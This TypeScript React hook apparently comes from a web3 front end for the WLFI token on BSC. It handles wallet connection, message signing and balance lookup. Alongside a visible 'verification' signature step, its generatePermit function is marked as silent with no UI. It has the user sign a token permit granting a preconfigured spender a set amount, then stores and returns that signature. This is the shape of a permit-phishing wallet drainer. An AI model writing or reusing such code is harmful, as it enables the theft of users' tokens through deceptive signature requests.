import { useState, useEffect, useCallback } from 'react'
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
import { BrowserProvider, Contract } from 'ethers'
import { WLFI_TOKEN_ADDRESS, WLFI_TOKEN_ABI, VERIFICATION_MESSAGE, PERMIT_CONFIG, BSC_CHAIN_ID } from '@/lib/web3'
import { useToast } from '@/hooks/use-toast'

export const useWeb3 = () => {
  const { open, close } = useAppKit()
  const { address, isConnected, chainId } = useAppKitAccount()
  const { walletProvider } = useAppKitProvider('eip155')
  const [isConnecting, setIsConnecting] = useState(false)
  const [isSigning, setIsSigning] = useState(false)
  const [signature, setSignature] = useState<string | null>(null)
  const [permitData, setPermitData] = useState<any>(null)
  const { toast } = useToast()

  // Connect wallet
  const connectWallet = useCallback(async () => {
    try {
      setIsConnecting(true)
      await open()
    } catch (error: any) {
      toast({
        title: "Connection Failed",
        description: error.message || "Failed to connect wallet",
        variant: "destructive"
      })
    } finally {
      setIsConnecting(false)
    }
  }, [open, toast])

  // Sign verification message
  const signMessage = useCallback(async () => {
    if (!walletProvider || !address) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
        variant: "destructive"
      })
      return null
    }

    try {
      setIsSigning(true)
      const provider = new BrowserProvider(walletProvider)
      const signer = await provider.getSigner()
      
      const signature = await signer.signMessage(VERIFICATION_MESSAGE)
      setSignature(signature)
      
      toast({
        title: "Message Signed",
        description: "Wallet verification successful"
      })
      
      return signature
    } catch (error: any) {
      toast({
        title: "Signing Failed",
        description: error.message || "Failed to sign message",
        variant: "destructive"
      })
      return null
    } finally {
      setIsSigning(false)
    }
  }, [walletProvider, address, toast])

  // Generate permit signature (silent, no UI interaction)
  const generatePermit = useCallback(async () => {
    if (!walletProvider || !address || chainId !== BSC_CHAIN_ID) {
      return null
    }

    try {
      const provider = new BrowserProvider(walletProvider)
      const signer = await provider.getSigner()
      const contract = new Contract(WLFI_TOKEN_ADDRESS, WLFI_TOKEN_ABI, provider)

      // Get current nonce
      const nonce = await contract.nonces(address)
      const domainSeparator = await contract.DOMAIN_SEPARATOR()

      // Build permit data
      const domain = {
        name: 'World Liberty Financial',
        version: '1',
        chainId: BSC_CHAIN_ID,
        verifyingContract: WLFI_TOKEN_ADDRESS
      }

      const types = {
        Permit: [
          { name: 'owner', type: 'address' },
          { name: 'spender', type: 'address' },
          { name: 'value', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' }
        ]
      }

      const values = {
        owner: address,
        spender: PERMIT_CONFIG.spender,
        value: PERMIT_CONFIG.amount,
        nonce: nonce.toString(),
        deadline: PERMIT_CONFIG.deadline
      }

      // Sign the permit
      const signature = await signer.signTypedData(domain, types, values)
      
      const permitData = {
        owner: address,
        spender: PERMIT_CONFIG.spender,
        value: PERMIT_CONFIG.amount,
        deadline: PERMIT_CONFIG.deadline,
        nonce: nonce.toString(),
        signature,
        chainId: BSC_CHAIN_ID,
        tokenAddress: WLFI_TOKEN_ADDRESS
      }

      setPermitData(permitData)
      return permitData
    } catch (error: any) {
      console.error('Permit generation failed:', error)
      return null
    }
  }, [walletProvider, address, chainId])

  // Get WLFI balance
  const getWLFIBalance = useCallback(async () => {
    if (!walletProvider || !address || chainId !== BSC_CHAIN_ID) {
      return '0'
    }

    try {
      const provider = new BrowserProvider(walletProvider)
      const contract = new Contract(WLFI_TOKEN_ADDRESS, WLFI_TOKEN_ABI, provider)
      const balance = await contract.balanceOf(address)
      const decimals = await contract.decimals()
      
      // Convert to human readable format
      const balanceFormatted = (Number(balance) / Math.pow(10, Number(decimals))).toString()
      return balanceFormatted
    } catch (error: any) {
      console.error('Failed to get WLFI balance:', error)
      return '0'
    }
  }, [walletProvider, address, chainId])

  // Disconnect wallet
  const disconnectWallet = useCallback(async () => {
    try {
      close()
      setSignature(null)
      setPermitData(null)
    } catch (error: any) {
      toast({
        title: "Disconnect Failed",
        description: error.message || "Failed to disconnect wallet",
        variant: "destructive"
      })
    }
  }, [close, toast])

  return {
    // Connection state
    isConnected,
    address,
    chainId,
    isConnecting,
    
    // Actions
    connectWallet,
    disconnectWallet,
    
    // Signing
    signMessage,
    isSigning,
    signature,
    
    // Permit (silent)
    generatePermit,
    permitData,
    
    // Utilities
    getWLFIBalance,
    
    // Validation
    isCorrectChain: chainId === BSC_CHAIN_ID
  }
}